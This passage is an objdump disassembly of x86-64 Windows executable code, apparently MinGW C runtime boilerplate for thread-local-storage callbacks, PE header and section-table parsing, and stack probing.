   32c481de8:	48 8d 0d b1 d2 00 00 	lea    0xd2b1(%rip),%rcx        # 0x32c48f0a0
   32c481def:	ff 15 cb f3 00 00    	call   *0xf3cb(%rip)        # 0x32c4911c0
   32c481df5:	48 8b 1d 84 d2 00 00 	mov    0xd284(%rip),%rbx        # 0x32c48f080
   32c481dfc:	48 85 db             	test   %rbx,%rbx
   32c481dff:	74 33                	je     0x32c481e34
   32c481e01:	48 8b 2d f0 f3 00 00 	mov    0xf3f0(%rip),%rbp        # 0x32c4911f8
   32c481e08:	48 8b 3d c1 f3 00 00 	mov    0xf3c1(%rip),%rdi        # 0x32c4911d0
   32c481e0f:	90                   	nop
   32c481e10:	8b 0b                	mov    (%rbx),%ecx
   32c481e12:	ff d5                	call   *%rbp
   32c481e14:	48 89 c6             	mov    %rax,%rsi
   32c481e17:	ff d7                	call   *%rdi
   32c481e19:	48 85 f6             	test   %rsi,%rsi
   32c481e1c:	74 0d                	je     0x32c481e2b
   32c481e1e:	85 c0                	test   %eax,%eax
   32c481e20:	75 09                	jne    0x32c481e2b
   32c481e22:	48 8b 43 08          	mov    0x8(%rbx),%rax
   32c481e26:	48 89 f1             	mov    %rsi,%rcx
   32c481e29:	ff d0                	call   *%rax
   32c481e2b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   32c481e2f:	48 85 db             	test   %rbx,%rbx
   32c481e32:	75 dc                	jne    0x32c481e10
   32c481e34:	48 8d 0d 65 d2 00 00 	lea    0xd265(%rip),%rcx        # 0x32c48f0a0
   32c481e3b:	48 83 c4 28          	add    $0x28,%rsp
   32c481e3f:	5b                   	pop    %rbx
   32c481e40:	5e                   	pop    %rsi
   32c481e41:	5f                   	pop    %rdi
   32c481e42:	5d                   	pop    %rbp
   32c481e43:	48 ff 25 96 f3 00 00 	rex.W jmp *0xf396(%rip)        # 0x32c4911e0
   32c481e4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c481e50:	48 83 ec 38          	sub    $0x38,%rsp
   32c481e54:	8b 05 2e d2 00 00    	mov    0xd22e(%rip),%eax        # 0x32c48f088
   32c481e5a:	41 89 c9             	mov    %ecx,%r9d
   32c481e5d:	85 c0                	test   %eax,%eax
   32c481e5f:	75 0f                	jne    0x32c481e70
   32c481e61:	31 c0                	xor    %eax,%eax
   32c481e63:	48 83 c4 38          	add    $0x38,%rsp
   32c481e67:	c3                   	ret
   32c481e68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c481e6f:	00 
   32c481e70:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   32c481e75:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c481e7a:	ba 18 00 00 00       	mov    $0x18,%edx
   32c481e7f:	44 89 4c 24 40       	mov    %r9d,0x40(%rsp)
   32c481e84:	e8 27 f8 ff ff       	call   0x32c4816b0
   32c481e89:	48 85 c0             	test   %rax,%rax
   32c481e8c:	74 49                	je     0x32c481ed7
   32c481e8e:	44 8b 4c 24 40       	mov    0x40(%rsp),%r9d
   32c481e93:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   32c481e98:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c481e9d:	48 8d 0d fc d1 00 00 	lea    0xd1fc(%rip),%rcx        # 0x32c48f0a0
   32c481ea4:	44 89 08             	mov    %r9d,(%rax)
   32c481ea7:	4c 89 40 08          	mov    %r8,0x8(%rax)
   32c481eab:	ff 15 0f f3 00 00    	call   *0xf30f(%rip)        # 0x32c4911c0
   32c481eb1:	48 8b 15 c8 d1 00 00 	mov    0xd1c8(%rip),%rdx        # 0x32c48f080
   32c481eb8:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c481ebd:	48 8d 0d dc d1 00 00 	lea    0xd1dc(%rip),%rcx        # 0x32c48f0a0
   32c481ec4:	48 89 50 10          	mov    %rdx,0x10(%rax)
   32c481ec8:	48 89 05 b1 d1 00 00 	mov    %rax,0xd1b1(%rip)        # 0x32c48f080
   32c481ecf:	ff 15 0b f3 00 00    	call   *0xf30b(%rip)        # 0x32c4911e0
   32c481ed5:	eb 8a                	jmp    0x32c481e61
   32c481ed7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   32c481edc:	eb 85                	jmp    0x32c481e63
   32c481ede:	66 90                	xchg   %ax,%ax
   32c481ee0:	48 83 ec 28          	sub    $0x28,%rsp
   32c481ee4:	8b 05 9e d1 00 00    	mov    0xd19e(%rip),%eax        # 0x32c48f088
   32c481eea:	85 c0                	test   %eax,%eax
   32c481eec:	75 0a                	jne    0x32c481ef8
   32c481eee:	31 c0                	xor    %eax,%eax
   32c481ef0:	48 83 c4 28          	add    $0x28,%rsp
   32c481ef4:	c3                   	ret
   32c481ef5:	0f 1f 00             	nopl   (%rax)
   32c481ef8:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   32c481efc:	48 8d 0d 9d d1 00 00 	lea    0xd19d(%rip),%rcx        # 0x32c48f0a0
   32c481f03:	ff 15 b7 f2 00 00    	call   *0xf2b7(%rip)        # 0x32c4911c0
   32c481f09:	48 8b 0d 70 d1 00 00 	mov    0xd170(%rip),%rcx        # 0x32c48f080
   32c481f10:	48 85 c9             	test   %rcx,%rcx
   32c481f13:	74 2e                	je     0x32c481f43
   32c481f15:	8b 54 24 30          	mov    0x30(%rsp),%edx
   32c481f19:	45 31 c0             	xor    %r8d,%r8d
   32c481f1c:	eb 0d                	jmp    0x32c481f2b
   32c481f1e:	66 90                	xchg   %ax,%ax
   32c481f20:	49 89 c8             	mov    %rcx,%r8
   32c481f23:	48 85 c0             	test   %rax,%rax
   32c481f26:	74 1b                	je     0x32c481f43
   32c481f28:	48 89 c1             	mov    %rax,%rcx
   32c481f2b:	8b 01                	mov    (%rcx),%eax
   32c481f2d:	39 d0                	cmp    %edx,%eax
   32c481f2f:	48 8b 41 10          	mov    0x10(%rcx),%rax
   32c481f33:	75 eb                	jne    0x32c481f20
   32c481f35:	4d 85 c0             	test   %r8,%r8
   32c481f38:	74 26                	je     0x32c481f60
   32c481f3a:	49 89 40 10          	mov    %rax,0x10(%r8)
   32c481f3e:	e8 75 f7 ff ff       	call   0x32c4816b8
   32c481f43:	48 8d 0d 56 d1 00 00 	lea    0xd156(%rip),%rcx        # 0x32c48f0a0
   32c481f4a:	ff 15 90 f2 00 00    	call   *0xf290(%rip)        # 0x32c4911e0
   32c481f50:	31 c0                	xor    %eax,%eax
   32c481f52:	48 83 c4 28          	add    $0x28,%rsp
   32c481f56:	c3                   	ret
   32c481f57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c481f5e:	00 00 
   32c481f60:	48 89 05 19 d1 00 00 	mov    %rax,0xd119(%rip)        # 0x32c48f080
   32c481f67:	eb d5                	jmp    0x32c481f3e
   32c481f69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c481f70:	48 83 ec 38          	sub    $0x38,%rsp
   32c481f74:	83 fa 02             	cmp    $0x2,%edx
   32c481f77:	0f 84 bb 00 00 00    	je     0x32c482038
   32c481f7d:	77 29                	ja     0x32c481fa8
   32c481f7f:	85 d2                	test   %edx,%edx
   32c481f81:	74 3d                	je     0x32c481fc0
   32c481f83:	8b 05 ff d0 00 00    	mov    0xd0ff(%rip),%eax        # 0x32c48f088
   32c481f89:	85 c0                	test   %eax,%eax
   32c481f8b:	0f 84 cf 00 00 00    	je     0x32c482060
   32c481f91:	c7 05 ed d0 00 00 01 	movl   $0x1,0xd0ed(%rip)        # 0x32c48f088
   32c481f98:	00 00 00 
   32c481f9b:	b8 01 00 00 00       	mov    $0x1,%eax
   32c481fa0:	48 83 c4 38          	add    $0x38,%rsp
   32c481fa4:	c3                   	ret
   32c481fa5:	0f 1f 00             	nopl   (%rax)
   32c481fa8:	83 fa 03             	cmp    $0x3,%edx
   32c481fab:	75 ee                	jne    0x32c481f9b
   32c481fad:	8b 05 d5 d0 00 00    	mov    0xd0d5(%rip),%eax        # 0x32c48f088
   32c481fb3:	85 c0                	test   %eax,%eax
   32c481fb5:	74 e4                	je     0x32c481f9b
   32c481fb7:	e8 24 fe ff ff       	call   0x32c481de0
   32c481fbc:	eb dd                	jmp    0x32c481f9b
   32c481fbe:	66 90                	xchg   %ax,%ax
   32c481fc0:	8b 05 c2 d0 00 00    	mov    0xd0c2(%rip),%eax        # 0x32c48f088
   32c481fc6:	85 c0                	test   %eax,%eax
   32c481fc8:	0f 85 82 00 00 00    	jne    0x32c482050
   32c481fce:	8b 05 b4 d0 00 00    	mov    0xd0b4(%rip),%eax        # 0x32c48f088
   32c481fd4:	83 f8 01             	cmp    $0x1,%eax
   32c481fd7:	75 c2                	jne    0x32c481f9b
   32c481fd9:	48 8b 05 a0 d0 00 00 	mov    0xd0a0(%rip),%rax        # 0x32c48f080
   32c481fe0:	48 85 c0             	test   %rax,%rax
   32c481fe3:	74 26                	je     0x32c48200b
   32c481fe5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c481fec:	00 00 00 00 
   32c481ff0:	48 89 c1             	mov    %rax,%rcx
   32c481ff3:	48 8b 40 10          	mov    0x10(%rax),%rax
   32c481ff7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c481ffc:	e8 b7 f6 ff ff       	call   0x32c4816b8
   32c482001:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c482006:	48 85 c0             	test   %rax,%rax
   32c482009:	75 e5                	jne    0x32c481ff0
   32c48200b:	48 8d 0d 8e d0 00 00 	lea    0xd08e(%rip),%rcx        # 0x32c48f0a0
   32c482012:	48 c7 05 63 d0 00 00 	movq   $0x0,0xd063(%rip)        # 0x32c48f080
   32c482019:	00 00 00 00 
   32c48201d:	c7 05 61 d0 00 00 00 	movl   $0x0,0xd061(%rip)        # 0x32c48f088
   32c482024:	00 00 00 
   32c482027:	ff 15 8b f1 00 00    	call   *0xf18b(%rip)        # 0x32c4911b8
   32c48202d:	e9 69 ff ff ff       	jmp    0x32c481f9b
   32c482032:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c482038:	e8 43 00 00 00       	call   0x32c482080
   32c48203d:	b8 01 00 00 00       	mov    $0x1,%eax
   32c482042:	48 83 c4 38          	add    $0x38,%rsp
   32c482046:	c3                   	ret
   32c482047:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48204e:	00 00 
   32c482050:	e8 8b fd ff ff       	call   0x32c481de0
   32c482055:	e9 74 ff ff ff       	jmp    0x32c481fce
   32c48205a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c482060:	48 8d 0d 39 d0 00 00 	lea    0xd039(%rip),%rcx        # 0x32c48f0a0
   32c482067:	ff 15 6b f1 00 00    	call   *0xf16b(%rip)        # 0x32c4911d8
   32c48206d:	e9 1f ff ff ff       	jmp    0x32c481f91
   32c482072:	90                   	nop
   32c482073:	90                   	nop
   32c482074:	90                   	nop
   32c482075:	90                   	nop
   32c482076:	90                   	nop
   32c482077:	90                   	nop
   32c482078:	90                   	nop
   32c482079:	90                   	nop
   32c48207a:	90                   	nop
   32c48207b:	90                   	nop
   32c48207c:	90                   	nop
   32c48207d:	90                   	nop
   32c48207e:	90                   	nop
   32c48207f:	90                   	nop
   32c482080:	db e3                	fninit
   32c482082:	c3                   	ret
   32c482083:	90                   	nop
   32c482084:	90                   	nop
   32c482085:	90                   	nop
   32c482086:	90                   	nop
   32c482087:	90                   	nop
   32c482088:	90                   	nop
   32c482089:	90                   	nop
   32c48208a:	90                   	nop
   32c48208b:	90                   	nop
   32c48208c:	90                   	nop
   32c48208d:	90                   	nop
   32c48208e:	90                   	nop
   32c48208f:	90                   	nop
   32c482090:	31 c0                	xor    %eax,%eax
   32c482092:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   32c482097:	75 0f                	jne    0x32c4820a8
   32c482099:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   32c48209d:	48 01 d1             	add    %rdx,%rcx
   32c4820a0:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   32c4820a6:	74 08                	je     0x32c4820b0
   32c4820a8:	c3                   	ret
   32c4820a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c4820b0:	31 c0                	xor    %eax,%eax
   32c4820b2:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   32c4820b8:	0f 94 c0             	sete   %al
   32c4820bb:	c3                   	ret
   32c4820bc:	0f 1f 40 00          	nopl   0x0(%rax)
   32c4820c0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   32c4820c4:	48 01 c8             	add    %rcx,%rax
   32c4820c7:	0f b7 48 06          	movzwl 0x6(%rax),%ecx
   32c4820cb:	66 85 c9             	test   %cx,%cx
   32c4820ce:	74 3d                	je     0x32c48210d
   32c4820d0:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   32c4820d5:	83 e9 01             	sub    $0x1,%ecx
   32c4820d8:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   32c4820dc:	4a 8d 44 00 18       	lea    0x18(%rax,%r8,1),%rax
   32c4820e1:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
   32c4820e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c4820ed:	00 00 00 
   32c4820f0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   32c4820f4:	4c 89 c1             	mov    %r8,%rcx
   32c4820f7:	4c 39 c2             	cmp    %r8,%rdx
   32c4820fa:	72 08                	jb     0x32c482104
   32c4820fc:	03 48 08             	add    0x8(%rax),%ecx
   32c4820ff:	48 39 ca             	cmp    %rcx,%rdx
   32c482102:	72 0b                	jb     0x32c48210f
   32c482104:	48 83 c0 28          	add    $0x28,%rax
   32c482108:	4c 39 c8             	cmp    %r9,%rax
   32c48210b:	75 e3                	jne    0x32c4820f0
   32c48210d:	31 c0                	xor    %eax,%eax
   32c48210f:	c3                   	ret
   32c482110:	55                   	push   %rbp
   32c482111:	57                   	push   %rdi
   32c482112:	56                   	push   %rsi
   32c482113:	53                   	push   %rbx
   32c482114:	48 83 ec 28          	sub    $0x28,%rsp
   32c482118:	48 89 cf             	mov    %rcx,%rdi
   32c48211b:	e8 90 63 00 00       	call   0x32c4884b0
   32c482120:	48 83 f8 08          	cmp    $0x8,%rax
   32c482124:	77 0e                	ja     0x32c482134
   32c482126:	48 8b 05 93 a2 00 00 	mov    0xa293(%rip),%rax        # 0x32c48c3c0
   32c48212d:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   32c482132:	74 14                	je     0x32c482148
   32c482134:	31 db                	xor    %ebx,%ebx
   32c482136:	48 89 d8             	mov    %rbx,%rax
   32c482139:	48 83 c4 28          	add    $0x28,%rsp
   32c48213d:	5b                   	pop    %rbx
   32c48213e:	5e                   	pop    %rsi
   32c48213f:	5f                   	pop    %rdi
   32c482140:	5d                   	pop    %rbp
   32c482141:	c3                   	ret
   32c482142:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c482148:	48 63 68 3c          	movslq 0x3c(%rax),%rbp
   32c48214c:	48 01 c5             	add    %rax,%rbp
   32c48214f:	81 7d 00 50 45 00 00 	cmpl   $0x4550,0x0(%rbp)
   32c482156:	75 dc                	jne    0x32c482134
   32c482158:	66 81 7d 18 0b 02    	cmpw   $0x20b,0x18(%rbp)
   32c48215e:	75 d4                	jne    0x32c482134
   32c482160:	66 83 7d 06 00       	cmpw   $0x0,0x6(%rbp)
   32c482165:	74 cd                	je     0x32c482134
   32c482167:	0f b7 45 14          	movzwl 0x14(%rbp),%eax
   32c48216b:	31 f6                	xor    %esi,%esi
   32c48216d:	48 8d 5c 05 18       	lea    0x18(%rbp,%rax,1),%rbx
   32c482172:	0f 1f 00             	nopl   (%rax)
   32c482175:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48217c:	00 00 00 00 
   32c482180:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   32c482186:	48 89 fa             	mov    %rdi,%rdx
   32c482189:	48 89 d9             	mov    %rbx,%rcx
   32c48218c:	e8 27 63 00 00       	call   0x32c4884b8
   32c482191:	85 c0                	test   %eax,%eax
   32c482193:	74 a1                	je     0x32c482136
   32c482195:	0f b7 45 06          	movzwl 0x6(%rbp),%eax
   32c482199:	83 c6 01             	add    $0x1,%esi
   32c48219c:	48 83 c3 28          	add    $0x28,%rbx
   32c4821a0:	39 c6                	cmp    %eax,%esi
   32c4821a2:	72 dc                	jb     0x32c482180
   32c4821a4:	eb 8e                	jmp    0x32c482134
   32c4821a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c4821ad:	00 00 00 
   32c4821b0:	48 8b 15 09 a2 00 00 	mov    0xa209(%rip),%rdx        # 0x32c48c3c0
   32c4821b7:	31 c0                	xor    %eax,%eax
   32c4821b9:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   32c4821be:	75 10                	jne    0x32c4821d0
   32c4821c0:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   32c4821c4:	49 01 d0             	add    %rdx,%r8
   32c4821c7:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   32c4821ce:	74 08                	je     0x32c4821d8
   32c4821d0:	c3                   	ret
   32c4821d1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c4821d8:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   32c4821df:	75 ef                	jne    0x32c4821d0
   32c4821e1:	45 0f b7 48 06       	movzwl 0x6(%r8),%r9d
   32c4821e6:	66 45 85 c9          	test   %r9w,%r9w
   32c4821ea:	74 e4                	je     0x32c4821d0
   32c4821ec:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   32c4821f1:	48 29 d1             	sub    %rdx,%rcx
   32c4821f4:	41 8d 51 ff          	lea    -0x1(%r9),%edx
   32c4821f8:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   32c4821fc:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
   32c482201:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   32c482206:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48220d:	00 00 00 
   32c482210:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   32c482214:	4c 89 c2             	mov    %r8,%rdx
   32c482217:	4c 39 c1             	cmp    %r8,%rcx
   32c48221a:	72 08                	jb     0x32c482224
   32c48221c:	03 50 08             	add    0x8(%rax),%edx
   32c48221f:	48 39 d1             	cmp    %rdx,%rcx
   32c482222:	72 ac                	jb     0x32c4821d0
   32c482224:	48 83 c0 28          	add    $0x28,%rax
   32c482228:	4c 39 c8             	cmp    %r9,%rax
   32c48222b:	75 e3                	jne    0x32c482210
   32c48222d:	31 c0                	xor    %eax,%eax
   32c48222f:	c3                   	ret
   32c482230:	48 8b 05 89 a1 00 00 	mov    0xa189(%rip),%rax        # 0x32c48c3c0
   32c482237:	31 c9                	xor    %ecx,%ecx
   32c482239:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   32c48223e:	75 0f                	jne    0x32c48224f
   32c482240:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   32c482244:	48 01 d0             	add    %rdx,%rax
   32c482247:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   32c48224d:	74 09                	je     0x32c482258
   32c48224f:	89 c8                	mov    %ecx,%eax
   32c482251:	c3                   	ret
   32c482252:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c482258:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   32c48225e:	75 ef                	jne    0x32c48224f
   32c482260:	0f b7 48 06          	movzwl 0x6(%rax),%ecx
   32c482264:	89 c8                	mov    %ecx,%eax
   32c482266:	c3                   	ret
   32c482267:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48226e:	00 00 
   32c482270:	4c 8b 05 49 a1 00 00 	mov    0xa149(%rip),%r8        # 0x32c48c3c0
   32c482277:	31 c0                	xor    %eax,%eax
   32c482279:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
   32c48227f:	75 0f                	jne    0x32c482290
   32c482281:	49 63 50 3c          	movslq 0x3c(%r8),%rdx
   32c482285:	4c 01 c2             	add    %r8,%rdx
   32c482288:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   32c48228e:	74 08                	je     0x32c482298
   32c482290:	c3                   	ret
   32c482291:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c482298:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   32c48229e:	75 f0                	jne    0x32c482290
   32c4822a0:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   32c4822a5:	66 45 85 c0          	test   %r8w,%r8w
   32c4822a9:	74 e5                	je     0x32c482290
   32c4822ab:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   32c4822af:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
   32c4822b4:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   32c4822b8:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   32c4822bc:	48 8d 54 d0 28       	lea    0x28(%rax,%rdx,8),%rdx
   32c4822c1:	0f 1f 40 00          	nopl   0x0(%rax)
   32c4822c5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4822cc:	00 00 00 00 
   32c4822d0:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   32c4822d4:	74 09                	je     0x32c4822df
   32c4822d6:	48 85 c9             	test   %rcx,%rcx
   32c4822d9:	74 b5                	je     0x32c482290
   32c4822db:	48 83 e9 01          	sub    $0x1,%rcx
   32c4822df:	48 83 c0 28          	add    $0x28,%rax
   32c4822e3:	48 39 c2             	cmp    %rax,%rdx
   32c4822e6:	75 e8                	jne    0x32c4822d0
   32c4822e8:	31 c0                	xor    %eax,%eax
   32c4822ea:	c3                   	ret
   32c4822eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4822f0:	48 8b 05 c9 a0 00 00 	mov    0xa0c9(%rip),%rax        # 0x32c48c3c0
   32c4822f7:	31 d2                	xor    %edx,%edx
   32c4822f9:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   32c4822fe:	75 0f                	jne    0x32c48230f
   32c482300:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   32c482304:	48 01 c1             	add    %rax,%rcx
   32c482307:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   32c48230d:	74 09                	je     0x32c482318
   32c48230f:	48 89 d0             	mov    %rdx,%rax
   32c482312:	c3                   	ret
   32c482313:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482318:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   32c48231e:	48 0f 44 d0          	cmove  %rax,%rdx
   32c482322:	48 89 d0             	mov    %rdx,%rax
   32c482325:	c3                   	ret
   32c482326:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48232d:	00 00 00 
   32c482330:	48 8b 15 89 a0 00 00 	mov    0xa089(%rip),%rdx        # 0x32c48c3c0
   32c482337:	31 c0                	xor    %eax,%eax
   32c482339:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   32c48233e:	75 10                	jne    0x32c482350
   32c482340:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   32c482344:	49 01 d0             	add    %rdx,%r8
   32c482347:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   32c48234e:	74 08                	je     0x32c482358
   32c482350:	c3                   	ret
   32c482351:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c482358:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   32c48235f:	75 ef                	jne    0x32c482350
   32c482361:	45 0f b7 48 06       	movzwl 0x6(%r8),%r9d
   32c482366:	66 45 85 c9          	test   %r9w,%r9w
   32c48236a:	74 e4                	je     0x32c482350
   32c48236c:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   32c482371:	48 29 d1             	sub    %rdx,%rcx
   32c482374:	41 8d 51 ff          	lea    -0x1(%r9),%edx
   32c482378:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   32c48237c:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
   32c482381:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   32c482386:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48238d:	00 00 00 
   32c482390:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   32c482394:	4c 89 c2             	mov    %r8,%rdx
   32c482397:	4c 39 c1             	cmp    %r8,%rcx
   32c48239a:	72 08                	jb     0x32c4823a4
   32c48239c:	03 50 08             	add    0x8(%rax),%edx
   32c48239f:	48 39 d1             	cmp    %rdx,%rcx
   32c4823a2:	72 0c                	jb     0x32c4823b0
   32c4823a4:	48 83 c0 28          	add    $0x28,%rax
   32c4823a8:	49 39 c1             	cmp    %rax,%r9
   32c4823ab:	75 e3                	jne    0x32c482390
   32c4823ad:	31 c0                	xor    %eax,%eax
   32c4823af:	c3                   	ret
   32c4823b0:	8b 40 24             	mov    0x24(%rax),%eax
   32c4823b3:	f7 d0                	not    %eax
   32c4823b5:	c1 e8 1f             	shr    $0x1f,%eax
   32c4823b8:	c3                   	ret
   32c4823b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c4823c0:	4c 8b 1d f9 9f 00 00 	mov    0x9ff9(%rip),%r11        # 0x32c48c3c0
   32c4823c7:	45 31 c0             	xor    %r8d,%r8d
   32c4823ca:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
   32c4823d0:	75 0f                	jne    0x32c4823e1
   32c4823d2:	49 63 53 3c          	movslq 0x3c(%r11),%rdx
   32c4823d6:	4c 01 da             	add    %r11,%rdx
   32c4823d9:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   32c4823df:	74 07                	je     0x32c4823e8
   32c4823e1:	4c 89 c0             	mov    %r8,%rax
   32c4823e4:	c3                   	ret
   32c4823e5:	0f 1f 00             	nopl   (%rax)
   32c4823e8:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   32c4823ee:	75 f1                	jne    0x32c4823e1
   32c4823f0:	8b 82 90 00 00 00    	mov    0x90(%rdx),%eax
   32c4823f6:	85 c0                	test   %eax,%eax
   32c4823f8:	74 e7                	je     0x32c4823e1
   32c4823fa:	44 0f b7 4a 06       	movzwl 0x6(%rdx),%r9d
   32c4823ff:	66 45 85 c9          	test   %r9w,%r9w
   32c482403:	74 dc                	je     0x32c4823e1
   32c482405:	44 0f b7 42 14       	movzwl 0x14(%rdx),%r8d
   32c48240a:	4a 8d 54 02 18       	lea    0x18(%rdx,%r8,1),%rdx
   32c48240f:	45 8d 41 ff          	lea    -0x1(%r9),%r8d
   32c482413:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
   32c482417:	4e 8d 54 c2 28       	lea    0x28(%rdx,%r8,8),%r10
   32c48241c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c482420:	44 8b 4a 0c          	mov    0xc(%rdx),%r9d
   32c482424:	4d 89 c8             	mov    %r9,%r8
   32c482427:	4c 39 c8             	cmp    %r9,%rax
   32c48242a:	72 09                	jb     0x32c482435
   32c48242c:	44 03 42 08          	add    0x8(%rdx),%r8d
   32c482430:	4c 39 c0             	cmp    %r8,%rax
   32c482433:	72 13                	jb     0x32c482448
   32c482435:	48 83 c2 28          	add    $0x28,%rdx
   32c482439:	49 39 d2             	cmp    %rdx,%r10
   32c48243c:	75 e2                	jne    0x32c482420
   32c48243e:	45 31 c0             	xor    %r8d,%r8d
   32c482441:	4c 89 c0             	mov    %r8,%rax
   32c482444:	c3                   	ret
   32c482445:	0f 1f 00             	nopl   (%rax)
   32c482448:	4c 01 d8             	add    %r11,%rax
   32c48244b:	eb 0a                	jmp    0x32c482457
   32c48244d:	0f 1f 00             	nopl   (%rax)
   32c482450:	83 e9 01             	sub    $0x1,%ecx
   32c482453:	48 83 c0 14          	add    $0x14,%rax
   32c482457:	44 8b 40 04          	mov    0x4(%rax),%r8d
   32c48245b:	45 85 c0             	test   %r8d,%r8d
   32c48245e:	75 07                	jne    0x32c482467
   32c482460:	8b 50 0c             	mov    0xc(%rax),%edx
   32c482463:	85 d2                	test   %edx,%edx
   32c482465:	74 d7                	je     0x32c48243e
   32c482467:	85 c9                	test   %ecx,%ecx
   32c482469:	7f e5                	jg     0x32c482450
   32c48246b:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   32c48246f:	4d 01 d8             	add    %r11,%r8
   32c482472:	4c 89 c0             	mov    %r8,%rax
   32c482475:	c3                   	ret
   32c482476:	90                   	nop
   32c482477:	90                   	nop
   32c482478:	90                   	nop
   32c482479:	90                   	nop
   32c48247a:	90                   	nop
   32c48247b:	90                   	nop
   32c48247c:	90                   	nop
   32c48247d:	90                   	nop
   32c48247e:	90                   	nop
   32c48247f:	90                   	nop
   32c482480:	51                   	push   %rcx
   32c482481:	50                   	push   %rax
   32c482482:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   32c482488:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   32c48248d:	72 19                	jb     0x32c4824a8
   32c48248f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
